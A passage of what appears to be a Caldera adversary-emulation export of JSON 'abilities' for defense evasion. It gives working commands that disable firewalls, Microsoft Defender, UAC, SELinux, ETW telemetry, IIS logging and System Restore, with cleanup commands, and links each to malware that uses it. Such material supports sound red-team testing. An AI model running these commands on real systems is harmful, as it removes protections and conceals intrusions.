2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netsh advfirewall set currentprofile state off", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "5b93df032e230056c21a3e57334f77d1", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Disable Microsoft Defender Firewall", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables the Microsoft Defender Firewall for the public profile via registry\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 1 /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "8fe59e288f10a486dc8b44bc872019ff", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Disable Microsoft Defender Firewall via Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null; Remove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"; New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"; New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "b66a6eed7d46ab2ca4c3bf1ae3b61f44", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Microsoft Office Security Features", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables OpenDNS Umbrella\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "a981a99ef7c8ad9d1960a8bcb413bc51", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable OpenDNS Umbrella", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["cmd /c \"#{ps_exec_location}\" -i -s cmd.exe /c logman update trace \"#{session}\" -p \"#{provider}\" -ets"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Indicator Blocking", "ability_id": "efe119524cf6e6b760c6e9ebe83bf107", "technique_id": "T1562.006", "tactic": "defense-evasion", "requirements": [], "name": "Disable Powershell ETW Provider - Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables SELinux enforcement\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["setenforce 1"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "setenforce 0", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "30c48293038e5b226c7a115e807c7350", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable SELinux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. \nSee how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f && reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f && reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inhibit System Recovery", "ability_id": "c8f329d2847ede593b6cb4a1ec6120fb", "technique_id": "T1490", "tactic": "impact", "requirements": [], "name": "Disable System Restore Through Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "e7d20e7f0087f8a4234c1d1b7a228bb0", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "3a67bc42e7f567d9faffab9af37afa72", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "Disable UAC using reg.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disable Win Defender Notification. Redline is using this to disable this win defender feature.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 0"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "609ae2466dfa661ac22a8d3a1c15d16a", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Win Defender Notification", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disable Windows Auto Reboot for current logon user. Redline is using this as part of its defense evasion.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 0"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "96030a3a84fc75385362f617843bb1ef", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Auto Reboot for current logon user", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "86993ae14d75a6da421c0d98c3facd61", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows CMD application", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "a713f8a033268f0b923012f527067640", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Change Password Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disable Windows Defender All", "repeatable": false, "privilege": "Elevated", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "b007f6e8-4a87-4440-8888-29ceab047d9b", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Defender All", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disable Windows Defender Real-Time Protection", "repeatable": false, "privilege": "Elevated", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) { Set-MPPreference -DisableRealtimeMonitoring 0; } else { $service = Get-Service WinDefend -ErrorAction SilentlyContinue; if ($service) { Start-Service WinDefend; } else { echo \"Windows Defender service not found.\"; exit 1; }; };"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Get-Command \"Set-MPPreference\" -ErrorAction SilentlyContinue) {\n  Set-MPPreference -DisableRealtimeMonitoring 1;\n} else {\n  $service = Get-Service WinDefend -ErrorAction SilentlyContinue;\n  if ($service) {\n    if ($service.Status -eq \"Running\") {\n      Stop-Service WinDefend;\n    }\n  } else {\n    echo \"Windows Defender service not found.\";\n    exit 1;\n  };\n};", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "49470433-30ce-4714-a44b-bea9dbbeca9a", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Defender Real-Time Protection", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "93b4f004682dfb6d1af15e01c2859f93", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Defender with DISM", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "afae914d4839d5194835d8475604e7b8", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Defender with PwSh Disable-WindowsOptionalFeature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems \nencounter in specific application or process.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1 && reg delete HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f && reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "e56b118fad900831f15bd550b5a5914a", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Error Reporting Settings", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){;   C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:false *>$null; }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Windows Event Logging", "ability_id": "bc5d26cf7201f1504b495ca2c1758ebf", "technique_id": "T1562.002", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows IIS HTTP Logging", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){;   C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:false *>$null; }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\Default Web Site\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Windows Event Logging", "ability_id": "7a0717485ca13c441d26bfaaa5c92535", "technique_id": "T1562.002", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows IIS HTTP Logging via PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "e3f2eac83f7f8148e53b9f2213830e44", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Lock Workstation Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /f >nul 2>&1 && reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f && reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "288a78bcbdc978bf78ee6d4f43b98442", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows LogOff Button", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "a8413387ed0d47a4fbd1bdf21359ebc6", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Notification Center", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 0"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "cb09dc16561713bc4558c54d42c6d513", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows OS Auto Update", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["powershell Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" -Name DisableRegistryTools -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "ba862ef17f5b9e438915d1cf33abf60a", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Disable Windows Registry Tool", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n", "repeatable": false, "privilege": "", "buckets": 